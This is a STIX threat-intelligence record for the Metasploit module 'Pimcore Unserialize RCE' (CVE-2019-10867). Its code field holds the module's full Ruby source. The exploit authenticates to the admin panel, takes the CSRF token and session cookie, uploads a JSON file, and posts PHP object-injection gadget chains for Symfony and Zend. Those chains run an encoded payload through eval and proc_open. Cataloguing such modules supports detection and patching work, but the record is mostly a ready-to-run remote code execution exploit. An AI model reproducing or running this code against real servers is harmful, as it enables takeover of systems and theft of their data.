{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cb7d0368-49fe-4adf-9803-68aa425f3731",
    "created": "2024-08-14T17:08:44.087487Z",
    "modified": "2024-08-14T17:08:44.087491Z",
    "name": "\"Pimcore Unserialize RCE\"",
    "description": "( This module exploits a PHP unserialize() in Pimcore before 5.7.1 to execute arbitrary code. An authenticated user with \"classes\" permission could exploit the vulnerability.  The vulnerability exists in the \"ClassController.php\" class, where the \"bulk-commit\" method makes it possible to exploit the unserialize function when passing untrusted values in \"data\" parameter.  Tested on Pimcore 5.4.0-5.4.4, 5.5.1-5.5.4, 5.6.0-5.6.6 with the Symfony unserialize payload.  Tested on Pimcore 4.0.0-4.6.5 with the Zend unserialize payload. ) 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/pimcore_unserialize_rce.rb",
            "external_id": "pimcore_unserialize_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-10867"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pimcore/pimcore/commit/38a29e2f4f5f060a73974626952501cee05fda73"
        },
        {
            "source_name": "reference",
            "url": "https://snyk.io/vuln/SNYK-PHP-PIMCOREPIMCORE-173998"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => \"Pimcore Unserialize RCE\",\n      'Description' => %q(\n        This module exploits a PHP unserialize() in Pimcore before 5.7.1 to\n        execute arbitrary code. An authenticated user with \"classes\" permission\n        could exploit the vulnerability.\n\n        The vulnerability exists in the \"ClassController.php\" class, where the\n        \"bulk-commit\" method makes it possible to exploit the unserialize function\n        when passing untrusted values in \"data\" parameter.\n\n        Tested on Pimcore 5.4.0-5.4.4, 5.5.1-5.5.4, 5.6.0-5.6.6 with the Symfony\n        unserialize payload.\n\n        Tested on Pimcore 4.0.0-4.6.5 with the Zend unserialize payload.\n      ),\n      'License' => MSF_LICENSE,\n      'Author' =>\n        [\n          'Daniele Scanu', # Discovery & PoC\n          'Fabio Cogno' # Metasploit module\n        ],\n      'References' =>\n        [\n          ['CVE', '2019-10867'],\n          ['URL', 'https://github.com/pimcore/pimcore/commit/38a29e2f4f5f060a73974626952501cee05fda73'],\n          ['URL', 'https://snyk.io/vuln/SNYK-PHP-PIMCOREPIMCORE-173998']\n        ],\n      'Platform' => 'php',\n      'Arch' => ARCH_PHP,\n      'Targets' =>\n        [\n          ['Pimcore 5.x (Symfony unserialize payload)', 'type' => :symfony],\n          ['Pimcore 4.x (Zend unserialize payload)', 'type' => :zend]\n        ],\n      'Payload' => {\n        'Space' => 8000,\n        'DisableNops' => true\n      },\n      'Privileged' => false,\n      'DisclosureDate' => '2019-03-11',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, \"Base Pimcore directory path\", '/']),\n        OptString.new('USERNAME', [true, \"Username to authenticate with\", '']),\n        OptString.new('PASSWORD', [false, \"Password to authenticate with\", ''])\n      ]\n    )\n  end\n\n  def login\n    # Try to login\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'admin', 'login', 'login'),\n      'vars_post' => {\n        'username' => datastore['USERNAME'],\n        'password' => datastore['PASSWORD']\n      }\n    )\n\n    unless res\n      fail_with(Failure::Unreachable, 'Connection failed')\n    end\n\n    if res.code == 302 && res.headers['Location'] =~ /\\/admin\\/\\?_dc=/\n      print_good(\"Authentication successful: #{datastore['USERNAME']}:#{datastore['PASSWORD']}\")\n\n      # Grabbing CSRF token and PHPSESSID cookie\n      return grab_csrftoken(res)\n    end\n\n    if res.code == 302 && res.headers['Location'] =~ /auth_failed=true/\n      fail_with(Failure::NoAccess, 'Invalid credentials')\n    end\n\n    fail_with(Failure::NoAccess, 'Authentication was unsuccessful')\n  end\n\n  def grab_csrftoken(auth_res)\n    uri = \"#{target_uri.path}admin/?_dc=#{auth_res.headers['Location'].scan(/\\/admin\\/\\?_dc=([0-9]+)/).flatten.first}\"\n\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(uri),\n      'cookie' => auth_res.get_cookies\n    )\n\n    if res && res.code == 200\n      # Pimcore 5.x\n      unless res.body.scan(/\"csrfToken\": \"[a-z0-9]+\",/).empty?\n        @csrf_token = res.body.scan(/\"csrfToken\": \"([a-z0-9]+)\",/).flatten.first.to_s\n        @pimcore_cookies = res.get_cookies.scan(/(PHPSESSID=[a-z0-9]+;)/).flatten[0]\n        fail_with(Failure::NotFound, 'Failed to retrieve cookies') unless @pimcore_cookies\n        @pimcore_cookies << \" pimcore_admin_sid=1;\"\n\n        # Version\n        version = res.body.scan(/\"pimcore platform \\(v([0-9]{1}\\.[0-9]{1}\\.[0-9]{1})\\|([a-z0-9]+)\\)\"/i).flatten[0]\n        build = res.body.scan(/\"pimcore platform \\(v([0-9]{1}\\.[0-9]{1}\\.[0-9]{1})\\|([a-z0-9]+)\\)\"/i).flatten[1]\n        fail_with(Failure::NotFound, 'Failed to retrieve the version and build') unless version && build\n        print_version(version, build)\n        return assign_target(version)\n      end\n\n      # Pimcore 4.x\n      unless res.body.scan(/csrfToken: \"[a-z0-9]+\",/).empty?\n        @csrf_token = res.body.scan(/csrfToken: \"([a-z0-9]+)\",/).flatten.first.to_s\n        @pimcore_cookies = res.get_cookies.scan(/(pimcore_admin_sid=[a-z0-9]+;)/).flatten[0]\n        fail_with(Failure::NotFound, 'Unable to retrieve cookies') unless @pimcore_cookies\n\n        # Version\n        version = res.body.scan(/version: \"([0-9]{1}\\.[0-9]{1}\\.[0-9]{1})\",/i).flatten[0]\n        build = res.body.scan(/build: \"([0-9]+)\",/i).flatten[0]\n        fail_with(Failure::NotFound, 'Failed to retrieve the version and build') unless version && build\n        print_version(version, build)\n        return assign_target(version)\n      end\n\n      # Version different from 4.x or 5.x\n      return nil\n    else\n      fail_with(Failure::NoAccess, 'Failed to grab csrfToken and PHPSESSID')\n    end\n  end\n\n  def print_version(version, build)\n    print_status(\"Pimcore version: #{version}\")\n    print_status(\"Pimcore build: #{build}\")\n  end\n\n  def assign_target(version)\n    if Rex::Version.new(version) >= Rex::Version.new('5.0.0') && Rex::Version.new(version) <= Rex::Version.new('5.6.6')\n      print_good(\"The target is vulnerable!\")\n      return targets[0]\n    elsif Rex::Version.new(version) >= Rex::Version.new('4.0.0') && Rex::Version.new(version) <= Rex::Version.new('4.6.5')\n      print_good(\"The target is vulnerable!\")\n      return targets[1]\n    else\n      print_error(\"The target is NOT vulnerable!\")\n      return nil\n    end\n  end\n\n  def upload\n    # JSON file payload\n    fpayload = \"{\\\"customlayout\\\":[{\\\"creationDate\\\": \\\"#{rand(1..9)}\\\", \\\"modificationDate\\\": \\\"#{rand(1..9)}\\\", \\\"userOwner\\\": \\\"#{rand(1..9)}\\\", \\\"userModification\\\": \\\"#{rand(1..9)}\\\"}]}\"\n    # construct POST data\n    data = Rex::MIME::Message.new\n    data.add_part(fpayload, 'application/json', nil, \"form-data; name=\\\"Filedata\\\"; filename=\\\"#{rand_text_alphanumeric(3..9)}.json\\\"\")\n\n    # send JSON file payload to bulk-import function\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'admin', 'class', 'bulk-import'),\n      'vars_get' => { 'csrfToken' => @csrf_token },\n      'cookie' => @pimcore_cookies,\n      'ctype' => \"multipart/form-data; boundary=#{data.bound}\",\n      'data' => data.to_s\n    )\n\n    unless res\n      fail_with(Failure::Unreachable, 'Connection failed')\n    end\n\n    if res.code == 200\n      json = res.get_json_document\n      if json['success'] == true\n        print_good(\"JSON payload uploaded successfully: #{json['filename']}\")\n        return json['filename']\n      else\n        print_warning('Could not determine JSON payload file upload')\n        return nil\n      end\n    end\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'admin', 'login')\n    )\n\n    unless res\n      return Exploit::CheckCode::Unknown\n    end\n\n    if res.code == 200 && res.headers =~ /pimcore/i || res.body =~ /pimcore/i\n      return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    # Try to log in, grab csrfToken and select target\n    my_target = login\n    if my_target.nil?\n      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')\n    end\n\n    # Try to upload JSON payload file\n    fname = upload\n\n    unless fname.nil?\n      # Register uploaded JSON payload file for cleanup\n      register_files_for_cleanup(fname)\n    end\n\n    print_status(\"Selected payload: #{my_target.name}\")\n\n    case my_target['type']\n    when :symfony\n      # The payload to execute\n      spayload = \"php -r 'eval(base64_decode(\\\"#{Rex::Text.encode_base64(payload.encoded)}\\\"));'\"\n\n      # The Symfony object payload\n      serialize = \"O:43:\\\"Symfony\\\\Component\\\\Cache\\\\Adapter\\\\ApcuAdapter\\\":3:{\"\n      serialize << \"s:64:\\\"\\x00Symfony\\\\Component\\\\Cache\\\\Adapter\\\\AbstractAdapter\\x00mergeByLifetime\\\";\"\n      serialize << \"s:9:\\\"proc_open\\\";\"\n      serialize << \"s:58:\\\"\\x00Symfony\\\\Component\\\\Cache\\\\Adapter\\\\AbstractAdapter\\x00namespace\\\";a:0:{}\"\n      serialize << \"s:57:\\\"\\x00Symfony\\\\Component\\\\Cache\\\\Adapter\\\\AbstractAdapter\\x00deferred\\\";\"\n      serialize << \"s:#{spayload.length}:\\\"#{spayload}\\\";}\"\n    when :zend\n      # The payload to execute\n      spayload = \"eval(base64_decode('#{Rex::Text.encode_base64(payload.encoded)}'));\"\n\n      # The Zend1 object payload\n      serialize = \"a:2:{i:7;O:8:\\\"Zend_Log\\\":1:{s:11:\\\"\\x00*\\x00_writers\\\";a:1:{\"\n      serialize << \"i:0;O:20:\\\"Zend_Log_Writer_Mail\\\":5:{s:16:\\\"\\x00*\\00_eventsToMail\\\";a:1:{\"\n      serialize << \"i:0;i:1;}s:22:\\\"\\x00*\\x00_layoutEventsToMail\\\";a:0:{}s:8:\\\"\\00*\\x00_mail\\\";\"\n      serialize << \"O:9:\\\"Zend_Mail\\\":0:{}s:10:\\\"\\x00*\\x00_layout\\\";O:11:\\\"Zend_Layout\\\":3:{\"\n      serialize << \"s:13:\\\"\\x00*\\x00_inflector\\\";O:23:\\\"Zend_Filter_PregReplace\\\":2:{\"\n      serialize << \"s:16:\\\"\\x00*\\x00_matchPattern\\\";s:7:\\\"/(.*)/e\\\";s:15:\\\"\\x00*\\x00_replacement\\\";\"\n      serialize << \"S:#{spayload.length}:\\\"#{spayload}\\\";}\"\n      serialize << \"s:20:\\\"\\x00*\\x00_inflectorEnabled\\\";b:1;s:10:\\\"\\x00*\\x00_layout\\\";\"\n      serialize << \"s:6:\\\"layout\\\";}s:22:\\\"\\x00*\\x00_subjectPrependText\\\";N;}}};i:7;i:7;}\"\n    end\n\n    # send serialized payload\n    send_request_cgi(\n      {\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri, 'admin', 'class', 'bulk-commit'),\n        'ctype' => 'application/x-www-form-urlencoded; charset=UTF-8',\n        'cookie' => @pimcore_cookies,\n        'vars_post' => {\n          'filename' => fname,\n          'data' => JSON.generate(\n            'type' => 'customlayout',\n            'name' => serialize\n          )\n        },\n        'headers' => {\n          'X-pimcore-csrf-token' => @csrf_token\n        }\n      }, 30\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-03-11",
    "x_mitre_platforms": [
        "php'"
    ]
}